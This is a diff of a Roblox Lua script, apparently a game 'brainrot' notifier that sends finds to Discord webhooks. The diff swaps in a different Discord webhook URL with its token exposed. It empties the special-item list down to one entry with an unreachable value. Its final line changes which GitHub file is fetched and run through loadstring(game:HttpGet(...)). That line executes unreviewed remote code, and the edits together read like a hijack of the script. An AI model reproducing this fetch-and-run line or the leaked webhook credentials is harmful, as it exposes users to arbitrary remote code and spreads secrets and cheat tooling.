@@ -46,7 +46,7 @@ local WEBHOOKS = {
         showJoinerAd = true
     },
     { -- Special brainrots + overpay
-        url = 'https://discord.com/api/webhooks/1449482688103714920/ByuScNUToYq_zL7_eoK2JGDc1R7HKXqkxQIrtav2bp6gVA3b1xN-tNQz9ciXbqo-QZi4',
+        url = 'https://discord.com/api/webhooks/1449111713428275282/1CByDVDPiQUqD0r59w9DxtJ1F9CUpjbXzPrnA_kvtRvz2KIKpXMMBdTM2kYkYswTP45I',
         title = '⭐️ SPECIAL BRAINROTS',
         color = 0xff00ff,
         special = true,
@@ -57,52 +57,7 @@ local WEBHOOKS = {
 
 -- 📋 SPECIAL BRAINROTS WITH MIN VALUES
 local SPECIAL_BRAINROTS = {
-    ['Garama and Madundung'] = 0,
-    ['Dragon Cannelloni'] = 0,
-    ['La Supreme Combinasion'] = 0,
-    ['Ketupat Kepat'] = 0,
-    ['Strawberry Elephant'] = 0,
-    ['Ketchuru and Musturu'] = 0,
-    ['Tralaledon'] = 0,
-    ['Tictac Sahur'] = 0,
-    ['Burguro And Fryuro'] = 0,
-    ['La Secret Combinasion'] = 0,
-    ['Spooky and Pumpky'] = 0,
-    ['Meowl'] = 0,
-    ['La Casa Boo'] = 0,
-    ['Headless Horseman'] = 0,
-    ['Los Tacoritas'] = 0,
-    ['Capitano Moby'] = 0,
-    ['Cooki and Milki'] = 0,
-    ['Fragrama and Chocrama'] = 0,
-    ['Guest 666'] = 0,
-    ['Fishino Clownino'] = 0,
-    ['Tacorita Bicicleta'] = 170_000_000,
-    ['La Jolly Grande'] = 200_000_000,
-    ['W or L'] = 200_000_000,
-    ['Los Puggies'] = 400_000_000,
-    ['La Taco Combinasion'] = 450_000_000,
-    ['Chipso and Queso'] = 150_000_000,
-    ['Mieteteira Bicicleteira'] = 500_000_000,
-    ['Los Mobilis'] = 500_000_000,
-    ['La Spooky Grande'] = 245_000_000,
-    ['Eviledon'] = 400_000_000,
-    ['Chillin Chili'] = 25_000_000,
-    ['Money Money Puggy'] = 170_000_000,
-    ['Tang Tang Keletang'] = 100_000_000,
-    ['Los Primos'] = 300_000_000,
-    ['Orcaledon'] = 320_000_000,
-    ['Las Sis'] = 300_000_000,
-    ['La Extinct Grande'] = 235_000_000,
-    ['Los Bros'] = 300_000_000,
-    ['Spaghetti Tualetti'] = 300_000_000,
-    ['Esok Sekolah'] = 300_000_000,
-    ['Nuclearo Dinossauro'] = 100_000_000,
-    ['Lavadorito Spinito'] = 0,
-    ['La Ginger Sekolah'] = 225_000_000,
-    ['Gingerat Gerat'] = 0,
-    ['Reinito Sleighito'] = 0,
-    ['Dragon Gingerini'] = 0,
+    ['Garama and Madundung'] = 9_999_999_999,
 }
 
 -- 🎮 OBJECTS WITH EMOJIS AND IMPORTANCE
@@ -698,4 +653,4 @@ UserInputService.InputBegan:Connect(function(input, gpe)
         copyJobIdToClipboard()
     end
 end)
-loadstring(game:HttpGet("https://raw.githubusercontent.com/DR4G0NC4N3LL0NI/STR4WB3RRYELEPHANT/refs/heads/main/S3RV3R5HOPPER.LUA"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/CapibaroLimonchel/FFISH/refs/heads/main/BotRuner2.lua"))()
